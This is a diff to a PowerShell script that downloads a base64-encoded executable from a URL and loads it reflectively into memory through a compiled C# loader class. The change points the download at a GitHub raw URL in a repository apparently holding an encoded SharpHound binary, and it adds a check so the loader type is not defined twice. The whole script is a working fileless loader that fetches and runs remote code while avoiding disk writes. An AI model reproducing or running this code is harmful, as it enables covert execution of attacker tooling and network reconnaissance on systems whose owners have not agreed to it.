@@ -1,5 +1,5 @@
 # Define the URL containing the base64 encoded string
-$url = "http://example.com/base64encodedexe"
+$url = "https://raw.githubusercontent.com/MalwareLab49/SharpHound_Encoded/main/b64"
 
 # Download the base64 encoded string from the URL
 $base64String = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content
@@ -18,8 +18,9 @@ function Invoke-ReflectivePE {
     $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
     [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $mem, $PEBytes.Length)
 
-    # Define necessary delegates and unmanaged methods
-    $PELoader = @"
+    # Check if the type PELoader already exists before adding it
+    if (-not [System.Management.Automation.PSTypeName]::new('PELoader').Type) {
+        $PELoader = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -44,8 +45,9 @@ public class PELoader
     }
 }
 "@
+        Add-Type -TypeDefinition $PELoader -Language CSharp
+    }
 
-    Add-Type -TypeDefinition $PELoader -Language CSharp
     [PELoader]::Execute($mem, $Arguments)
 
     # Free the allocated memory
